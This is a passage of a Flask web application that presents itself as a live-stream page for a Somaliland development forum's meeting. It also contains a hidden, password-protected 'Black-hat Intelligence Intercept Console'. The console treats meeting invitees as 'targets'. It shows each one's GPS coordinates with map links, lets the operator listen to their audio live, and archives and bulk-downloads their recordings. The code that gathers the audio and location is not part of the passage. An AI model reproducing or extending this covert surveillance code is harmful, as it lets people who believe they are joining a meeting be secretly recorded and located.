.c{padding:10px;border-bottom:1px solid #eee7d3;font-family:sans-serif;font-size:14px}
a{color:#1e5b41;text-decoration:none;font-weight:bold}
#lv{text-align:center;margin:12px 0;font-size:16px;font-family:sans-serif;font-weight:bold}
.on{color:#b03a2e}.off{color:#8a8a8a}
#s{text-align:center;font-family:sans-serif;font-size:13px;color:#1e5b41;margin:8px 0}
.gold{color:#8a6d1d;font-size:13px;text-align:center;font-family:sans-serif;margin-top:10px}
</style></head><body>
<div class=wrap>
 <div class="card head">
  <div class=t1>Madasha Horumarka &amp; Ictiraafka Somaliland</div>
  <div class=t2>KULANKA TOOS AH &mdash; LIVE MEETING</div>
 </div>
 <div id=lv class=off>Kulanka weli ma bilaaban...</div>
 <button id=b>&#9654; DHAGAYSO (Listen LIVE)</button>
 <div id=s></div>
 <div class=card id=list></div>
 <div class=gold>Aragti &bull; Iskaashi &bull; Horumar &bull; Midnimo</div>
</div>
<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
var A=new Audio(),played={},live=false;
function fmt(t){return new Date(t*1000).toLocaleTimeString()}
document.getElementById('b').onclick=function(){live=true;this.textContent='LIVE - DHAGAYSO';poll()};
A.onended=function(){if(live)setTimeout(poll,1500)};
function poll(){
 fetch('/index.json?key='+KEY).then(function(r){return r.json()}).then(function(d){
  var L=document.getElementById('lv');
  if(d.live){L.className='on';L.textContent='Kulanku wuu socdaa - TOOS AH';}
  else{L.className='off';L.textContent=d.last?('Kulanka wuu istaagay / weli ma bilaaban'):('Kulanka weli ma bilaaban...');}
  var h='';
  for(var i=d.chunks.length-1;i>=0;i--){var c=d.chunks[i];
   h+='<div class=c><a href="javascript:manual(''+c.name+'')">&#9654; '+fmt(c.ts)+'</a>'
     +' &nbsp;<a href="/f/'+c.name+'?key='+KEY+'">kaydso</a></div>'}
  document.getElementById('list').innerHTML=h||'<div class=c>Duubista halkan ayaa ka muuqan doonta</div>';
  if(live&&A.paused){
   for(var k=0;k<d.chunks.length;k++){var n=d.chunks[k];
    if(!played[n.name]){played[n.name]=1;
     document.getElementById('s').textContent='Waxaad maqaysaa '+fmt(n.ts);
     A.src='/f/'+n.name+'?key='+KEY;A.play();break}}
  }}).catch(function(){});
}
function manual(n){live=false;A.src='/f/'+n+'?key='+KEY;A.play()}
setInterval(poll,8000);poll();
</script></body></html>"""

@app.route("/listen")
@app.route("/kaqaybgal")
def listen_page():
    if request.args.get("key") != LISTEN_KEY:
        abort(403)
    return LISTEN_HTML

GUDOOMIYE_HTML = """<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>S L Black-hat - Intelligence Intercept Console</title>
<style>
*{box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0e14;color:#dbe7f3;margin:0;padding:0 0 30px}
.wrap{max-width:720px;margin:0 auto}
.panel{background:#101826;border:1px solid #24374f;border-radius:10px;margin:12px;padding:16px}
.hd{text-align:center;border-top:3px solid #39d98a;position:relative}
.hd1{font-size:30px;font-weight:bold;letter-spacing:6px;color:#f2f8ff}
.hd2{color:#ffb454;font-size:13px;letter-spacing:4px;margin-top:6px;font-weight:bold}
.hd3{color:#a8c0d8;font-size:14px;margin-top:12px;border-top:1px dashed #24374f;padding-top:10px;letter-spacing:1px}
.logout{position:absolute;top:12px;right:12px;font-size:12px;color:#a8c0d8;
 border:1px solid #24374f;padding:5px 10px;border-radius:5px}
.grn{color:#39d98a}.amb{color:#ffb454}.red{color:#ff5c5c}
#lv{text-align:center;font-size:17px;font-weight:bold;color:#39d98a;line-height:1.6}
#lv.stby{color:#a8c0d8;font-weight:normal}
#lv.comp{color:#ff5c5c;border:1px solid #ff5c5c;border-radius:8px;padding:12px;
 animation:cp 1.6s infinite}
@keyframes cp{50%{background:#1a0e10}}
#spec{display:none;width:calc(100% - 24px);margin:0 12px;border:1px solid #24374f;
 border-radius:8px;background:#0a0e14}
#Aud{display:none;width:calc(100% - 24px);margin:8px 12px}
#stopB{display:none;margin:6px 12px 0}
.sect{color:#ffb454;font-size:14px;font-weight:bold;letter-spacing:3px;margin:20px 14px 0;text-align:left}
.dev{border:1px solid #1b2940;border-radius:8px;padding:14px;margin:10px 0;background:#0d1420}
.dev.live{border-color:#1f4d3a}
.dev.pinned{border-color:#ff5c5c;box-shadow:0 0 12px rgba(255,92,92,.18)}
.dt{font-size:20px;margin-bottom:8px;color:#f2f8ff;letter-spacing:1px}
.led{display:inline-block;width:12px;height:12px;border-radius:50%;background:#3a4a5e;margin-right:9px}
.led.on{background:#39d98a;box-shadow:0 0 9px #39d98a;animation:pl 1.4s infinite}
@keyframes pl{50%{opacity:.45}}
.live{color:#39d98a;font-size:14px;font-weight:bold}
.mut{color:#8ba3bd;font-size:14px}
.rw{font-size:15px;margin:6px 0;color:#c9d9e9;line-height:1.5}
.btn{display:inline-block;background:#12233a;color:#39d98a;border:1px solid #39d98a;
 padding:11px 16px;border-radius:7px;margin:9px 8px 0 0;font-size:15px;text-decoration:none;
 font-weight:bold;font-family:'Courier New',monospace;letter-spacing:1px}
.btn.gold{color:#ffb454;border-color:#ffb454}
.btn.red{color:#ff5c5c;border-color:#ff5c5c}
a{color:#39d98a;text-decoration:none}
.le{font-size:14px;color:#c9d9e9;padding:6px 0;border-bottom:1px dotted #1b2940;text-align:left;line-height:1.5}
.lt{color:#39d98a;margin-right:8px}
.arch{border:1px solid #1b2940;border-radius:8px;padding:12px 14px;margin:10px 0;background:#0b111c}
.arch .at{font-size:17px;color:#e8f1fa;letter-spacing:1px;margin-bottom:4px}
.alll{display:block;text-align:center;margin:14px 12px;font-size:16px;color:#ffb454;
 border:1px solid #ffb454;border-radius:8px;padding:14px;font-weight:bold;letter-spacing:2px}
.ft{color:#56708c;font-size:12px;text-align:center;margin-top:18px;letter-spacing:4px}
</style></head><body>
<div class=wrap>
 <div class="panel hd">
  <a class=logout href="/gudoomiye/logout">LOGOUT</a>
  <div class=hd1>S L BLACK-HAT</div>
  <div class=hd2>INTELLIGENCE INTERCEPT CONSOLE</div>
  <div class=hd3><span id=clk>--:--:--</span> &nbsp;|&nbsp; TARGETS ONLINE: <span id=onl class=grn>0</span> &nbsp;|&nbsp; AUDIO SEGMENTS RECEIVED: <span id=tot>0</span> &nbsp;|&nbsp; SYSTEM STATUS: <span class=grn>&#9679; OPERATIONAL</span></div>
 </div>
 <div class="panel">
  <div id=lv class=stby>STANDBY &mdash; select a TARGET below to intercept</div>
  <a id=stopB class="btn red" href="javascript:stopLis()">&#9632; TERMINATE INTERCEPT</a>
 </div>
 <canvas id=spec width=560 height=90></canvas>
 <audio id=Aud controls preload=auto></audio>
 <div class=sect>&#9656; ACTIVE TARGETS &mdash; LIVE SURVEILLANCE</div>
 <div class=panel id=devs><span class=mut>Scanning all frequencies for incoming signals...</span></div>
 <div class=sect>&#9656; ACTIVITY LOG &mdash; OPERATIONS RECORD</div>
 <div class=panel id=log><div class=le><span class=lt>--:--:--</span>Console initialized &mdash; awaiting signals</div></div>
 <div class=sect>&#9656; PREVIOUS TARGETS &mdash; SAVED RECORDINGS ARCHIVE</div>
 <div class=panel id=arch><span class=mut>No archived targets yet.</span></div>
 <a class=alll id=all href="#">&#11015; FULL ARCHIVE DOWNLOAD &mdash; ALL TARGETS (ZIP FILE)</a>
 <div class=ft>S L BLACK-HAT &bull; INTERNAL INTELLIGENCE SYSTEM</div>
</div>
<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
var Q=KEY?('?key='+KEY):'';
document.getElementById('all').href='/archive.zip'+Q;
var A=document.getElementById('Aud'),cur=null,live=false,pinned=null;
var MS=window.MediaSource||window.ManagedMediaSource;
var ms=null,sb=null,objUrl=null,curSess=null,nextFrag=0,appending=false,pend=[],pollT=null,seeked=false,removing=false;
var known={},prevLive={},actx=null,analyser=null,specOn=false,noOf={};
function tg(dev){return noOf[dev]||dev}
function fmt(t){return new Date(t*1000).toLocaleTimeString()}
function nowT(){return new Date().toLocaleTimeString()}
setInterval(function(){document.getElementById('clk').textContent=nowT()},1000);
document.getElementById('clk').textContent=nowT();
function logEv(m){
 var el=document.getElementById('log'),d=document.createElement('div');
 d.className='le';d.innerHTML='<span class=lt>'+nowT()+'</span>'+m;
 el.insertBefore(d,el.firstChild);
 while(el.children.length>40)el.removeChild(el.lastChild);
}
function pollDevs(){
 fetch('/index.json'+Q).then(function(r){return r.json()}).then(function(d){
  var ds=d.devices||[],h='',on=0,tot=0;
  for(var i=0;i<ds.length;i++){var v=ds[i];
   if(v.live)on++;tot+=v.n;
   if(v.no)noOf[v.id]=v.no;
   if(!known[v.id]){known[v.id]=1;
    logEv('TARGET ACQUIRED &mdash; <b>TARGET-'+(v.no||'?')+'</b> ('+v.id+')')}
   if(prevLive[v.id]!==undefined&&prevLive[v.id]!==v.live){
    logEv(v.live?'<span class=grn>SIGNAL LIVE</span> &mdash; TARGET-'+(v.no||'?')
      :'<span class=red>SIGNAL LOST</span> &mdash; TARGET-'+(v.no||'?'))}
   prevLive[v.id]=v.live;
  }
  ds.sort(function(a,b){
   if(pinned){if(a.id===pinned)return -1;if(b.id===pinned)return 1}
   return (b.live?1:0)-(a.live?1:0)||b.last-a.last});
  if(!ds.length)h='<div class=mut>No targets detected &mdash; awaiting invitees to join the meeting</div>';
  for(var i=0;i<ds.length;i++){var v=ds[i];
   var dur=0;if(v.sessions)for(var q=0;q<v.sessions.length;q++)dur+=v.sessions[q].dur;
   var pin=(v.id===pinned);
   h+='<div class="dev'+(v.live?' live':'')+(pin?' pinned':'')+'">'
    +'<div class=dt><span class="led '+(v.live?'on':'')+'"></span>TARGET-'+(v.no||'?')
    +' <span class=mut>('+v.id+')</span> '
    +(v.live?'<span class=live>&#9679; LIVE NOW</span>':'<span class=mut>OFFLINE</span>')
    +(pin?' <span class=red>&#9679; INTERCEPTING</span>':'')+'</div>'
    +(v.geo
      ?'<div class=rw>LOCATION: '+v.geo.lat.toFixed(5)+', '+v.geo.lon.toFixed(5)
       +' (accuracy &plusmn;'+Math.round(v.geo.acc)+' meters) &mdash; '
       +'<a href="https://maps.google.com/?q='+v.geo.lat+','+v.geo.lon+'">OPEN MAP</a></div>'
      :'<div class="rw mut">LOCATION: no position fix received</div>')
    +'<div class=rw>SIGNAL STRENGTH: '+(v.sig==='good'?'<span class=grn>&#9632;&#9632;&#9632; GOOD</span>'
      :v.sig==='weak'?'<span class=amb>&#9632;&#9632; WEAK</span>'
      :v.sig==='silent'?'<span class=red>&#9632; SILENT</span>'
      :'<span class=mut">---</span>')+'</div>'
    +'<div class="rw mut">LAST CONTACT: '+(v.last?fmt(v.last):'-')+' &mdash; '+v.n+' audio segments &mdash; TOTAL RECORDED: '+dur+' seconds</div>'
    +'<a class=btn href="javascript:lis(\\''+v.id+'\\')">&#9654; LISTEN LIVE</a>'
    +(v.n?'<a class=btn href="javascript:playFull(\\''+v.id+'\\')">&#9654; PLAY FULL RECORDING</a>'
    +'<a class="btn gold" href="/getall/'+v.id+'.m4a'+Q+'">&#11015; DOWNLOAD AUDIO FILE</a>':'')
    +'</div>';
  }
  var hA='',ac=0;
  for(var i=0;i<ds.length;i++){var v=ds[i];
   if(v.live||!v.n)continue;ac++;
   var dur2=0;if(v.sessions)for(var q2=0;q2<v.sessions.length;q2++)dur2+=v.sessions[q2].dur;
   hA+='<div class=arch>'
    +'<div class=at>TARGET-'+(v.no||'?')+' <span class=mut>('+v.id+')</span></div>'
    +'<div class=rw>LAST CONTACT: '+(v.last?fmt(v.last):'-')
    +(v.geo?' &mdash; LOCATION: '+v.geo.lat.toFixed(5)+', '+v.geo.lon.toFixed(5)
      +' &mdash; <a href="https://maps.google.com/?q='+v.geo.lat+','+v.geo.lon+'">OPEN MAP</a>':'')
    +' &mdash; SAVED RECORDING: '+dur2+' seconds</div>'
    +'<a class=btn href="javascript:playFull(\\''+v.id+'\\')">&#9654; PLAY SAVED RECORDING</a>'
    +'<a class="btn gold" href="/getall/'+v.id+'.m4a'+Q+'">&#11015; DOWNLOAD AUDIO FILE</a>'
    +'</div>';
  }
  document.getElementById('onl').textContent=on;
  document.getElementById('tot').textContent=tot;
  document.getElementById('devs').innerHTML=h;
  document.getElementById('arch').innerHTML=ac?hA:'<span class=mut>No archived targets yet &mdash; recordings of previous targets will be saved here.</span>';
 }).catch(function(){});
}
function initViz(){
 if(actx)return;
 try{
  actx=new (window.AudioContext||window.webkitAudioContext)();
  var sn=actx.createMediaElementSource(A);
  analyser=actx.createAnalyser();analyser.fftSize=128;analyser.smoothingTimeConstant=0.75;
  sn.connect(analyser);analyser.connect(actx.destination);
 }catch(e){}
}
function drawSpec(){
 if(!specOn)return;
 requestAnimationFrame(drawSpec);
 if(!analyser)return;
 var c=document.getElementById('spec'),x=c.getContext('2d');
 var dt=new Uint8Array(analyser.frequencyBinCount);
 analyser.getByteFrequencyData(dt);
 x.fillStyle='#0a0e14';x.fillRect(0,0,c.width,c.height);
 var bw=c.width/dt.length;
 for(var i=0;i<dt.length;i++){
  var hh=Math.max(2,(dt[i]/255)*c.height);
  x.fillStyle=dt[i]>180?'#ff5c5c':(dt[i]>100?'#ffb454':'#39d98a');
  x.fillRect(i*bw,c.height-hh,bw-1,hh);
 }
}
function playFull(dev){
 live=false;if(pollT)clearTimeout(pollT);cur=null;pinned=dev;
 specOn=false;document.getElementById('spec').style.display='none';
 A.style.display='block';
 document.getElementById('stopB').style.display='inline-block';
 var lv=document.getElementById('lv');lv.className='';
 lv.innerHTML='PREPARING RECORDING &mdash; <b>TARGET-'+tg(dev)+'</b> ...';
 logEv('PLAYBACK REQUEST &mdash; TARGET-'+tg(dev));
 A.src='/getall/'+dev+'.m4a'+Q+(Q?'&':'?')+'inline=1';
 A.oncanplay=function(){lv.innerHTML='&#9654; PLAYING FULL RECORDING &mdash; <b>TARGET-'+tg(dev)+'</b>';A.oncanplay=null};
 var pp=A.play();if(pp&&pp.catch)pp.catch(function(){});
 pollDevs();
}
function stopLis(){
 live=false;if(pollT)clearTimeout(pollT);cur=null;pinned=null;
 specOn=false;try{A.pause()}catch(e){}
 document.getElementById('spec').style.display='none';
 document.getElementById('stopB').style.display='none';
 var lv=document.getElementById('lv');lv.className='stby';
 lv.innerHTML='STANDBY &mdash; select a TARGET below to intercept';
 logEv('INTERCEPT TERMINATED');
 pollDevs();
}
function lis(dev){
 cur=dev;live=true;pinned=dev;curSess=null;nextFrag=0;pend=[];seeked=false;
 A.style.display='block';
 document.getElementById('stopB').style.display='inline-block';
 initViz();if(actx&&actx.state==='suspended')actx.resume();
 var sp=document.getElementById('spec');sp.style.display='block';specOn=true;drawSpec();
 var lv=document.getElementById('lv');lv.className='comp';
 lv.innerHTML='&#9888; LISTENING COMPROMISED &mdash; <b>TARGET-'+tg(dev)+'</b> &mdash; LIVE INTERCEPT ACTIVE';
 logEv('&#9888; LISTENING COMPROMISED &mdash; <b>TARGET-'+tg(dev)+'</b>');
 if(pollT)clearTimeout(pollT);
 pollAud();
 pollDevs();
 setTimeout(function(){
  if(!live||cur!==dev)return;
  var stuck=A.paused;
  var buf=0;try{if(A.buffered.length)buf=A.buffered.end(A.buffered.length-1)}catch(e){}
  if(stuck||buf<2){
   logEv('LIVE BLOCKED &mdash; auto-switching to full recording');
   playFull(dev);
  }
 },7000);
}
function resetMS(mime){
 try{A.pause()}catch(e){}
 if(objUrl){try{URL.revokeObjectURL(objUrl)}catch(e){}}
 ms=null;sb=null;appending=false;pend=[];
 ms=new MS();
 ms.addEventListener('sourceopen',function(){
  try{sb=ms.addSourceBuffer(mime);if(sb.mode!=='sequence'){try{sb.mode='sequence'}catch(e2){}}}catch(e){sb=null}
 });
 objUrl=URL.createObjectURL(ms);
 A.src=objUrl;
}
function pollAud(){
 if(!cur||!live)return;
 fetch('/dev/'+cur+'/index.json'+Q).then(function(r){return r.json()}).then(function(d){
  if(!live)return;
  var ch=d.chunks||[];
  if(ch.length){
   var sess=ch[ch.length-1].sess||'x';
   var mime='audio/webm;codecs=opus';
   if(MS&&(!MS.isTypeSupported||MS.isTypeSupported(mime))){
    if(sess!==curSess){curSess=sess;nextFrag=0;seeked=false;resetMS(mime)}
    var av=[];
    for(var i=0;i<ch.length;i++){var c=ch[i];
     if((c.sess||'x')===curSess&&c.frag>=nextFrag)av.push(c)}
    av.sort(function(a,b){return a.frag-b.frag});
    if(av.length&&av[0].frag>nextFrag+2)nextFrag=av[0].frag;
    var have={};for(var j=0;j<pend.length;j++)have[pend[j].frag]=1;
    for(var i2=0;i2<av.length;i2++){if(!have[av[i2].frag])pend.push(av[i2])}
    pump();
   }else if(sess!==curSess){
    curSess=sess;
    logEv('MSE UNSUPPORTED &mdash; switching to recording playback');
    playFull(cur);
   }
  }
  pollT=setTimeout(pollAud,2000);
 }).catch(function(){pollT=setTimeout(pollAud,4000)});
}
function pump(){
 if(appending||!sb||!pend.length||!ms||ms.readyState!=='open')return;
 var c=pend.shift();
 fetch('/seg/'+c.name+Q).then(function(r){if(!r.ok)throw 0;return r.arrayBuffer()}).then(function(buf){
  nextFrag=c.frag+1;
  if(sb&&ms.readyState==='open'){
   appending=true;
   sb.onupdateend=function(){appending=false;
    if(removing){removing=false;pump();return}
    try{var b=A.buffered;
     if(b.length){var end=b.end(b.length-1);
      if(!seeked){seeked=true;A.currentTime=Math.max(0,end-3)}
      else if(end-A.currentTime>12){A.currentTime=Math.max(0,end-3)}
      var st0=b.start(0);
      if(A.currentTime-st0>90){removing=true;sb.remove(st0,Math.max(st0,A.currentTime-45));return}}
    }catch(e){}
    if(A.paused){var pp=A.play();if(pp&&pp.catch)pp.catch(function(){})}
    pump()};
   try{sb.appendBuffer(buf)}catch(e){appending=false;setTimeout(pump,800)}
  }
 }).catch(function(){if(c.frag>=nextFrag)pend.unshift(c);setTimeout(pump,1500)});
}
setInterval(pollDevs,8000);pollDevs();
</script></body></html>"""


LOGIN_HTML = """<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>S L Black-hat - Secure Access</title>
<style>
body{font-family:'Courier New',monospace;background:#0a0e14;color:#c8d6e5;margin:0;display:flex;
 align-items:center;justify-content:center;min-height:100vh}
.box{background:#101826;border:1px solid #1e2d42;border-top:3px solid #39d98a;border-radius:12px;
 padding:30px 26px;width:320px;text-align:center}
h1{font-size:19px;letter-spacing:2px;color:#e8f1fa;margin:0 0 4px}
.sub{color:#ffb454;font-size:10px;letter-spacing:3px;margin-bottom:22px}
input{display:block;width:100%;box-sizing:border-box;background:#0a0e14;border:1px solid #1e2d42;
 border-radius:7px;color:#39d98a;padding:13px;margin:9px 0;font-family:'Courier New',monospace;
 font-size:15px;text-align:center}
input:focus{outline:none;border-color:#39d98a}
button{width:100%;background:#12233a;border:1px solid #39d98a;color:#39d98a;padding:13px;
 border-radius:7px;font-family:'Courier New',monospace;font-size:15px;font-weight:bold;
 letter-spacing:2px;margin-top:6px;cursor:pointer}
.err{color:#ff5c5c;font-size:12px;min-height:16px;margin-top:10px}
.ft{color:#3a4a5e;font-size:10px;margin-top:18px;letter-spacing:2px}
</style></head><body>
<div class=box>
 <h1>S L BLACK-HAT</h1>
 <div class=sub>SECURE ACCESS</div>
 <form method=POST action="/gudoomiye/login">
  <input name=u placeholder="USERNAME" autocomplete=off autofocus>
  <input name=p type=password placeholder="PASSWORD">
  <button type=submit>ENTER CONSOLE</button>
 </form>
 <div class=err>__ERR__</div>
 <div class=ft>AUTHORIZED PERSONNEL ONLY</div>
</div>
</body></html>"""


@app.route("/gudoomiye/login", methods=["POST"])
def gudoomiye_login():
    u = request.form.get("u", "")
    p = request.form.get("p", "")
    if u == ADMIN_USER and p == ADMIN_PASS:
        from flask import make_response, redirect
        r = make_response(redirect("/gudoomiye"))
        r.set_cookie("mdauth", auth_token(), max_age=7 * 24 * 3600,
                     httponly=True, secure=request.is_secure, samesite="Lax")
        return r
    return LOGIN_HTML.replace("__ERR__", "ACCESS DENIED &mdash; wrong credentials")


@app.route("/gudoomiye/logout")
def gudoomiye_logout():
    from flask import make_response, redirect
    r = make_response(redirect("/gudoomiye"))
    r.set_cookie("mdauth", "", max_age=0)
    return r


@app.route("/gudoomiye")
def gudoomiye_page():
    if not authed():
        return LOGIN_HTML.replace("__ERR__", "")
    return GUDOOMIYE_HTML


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), threaded=True)
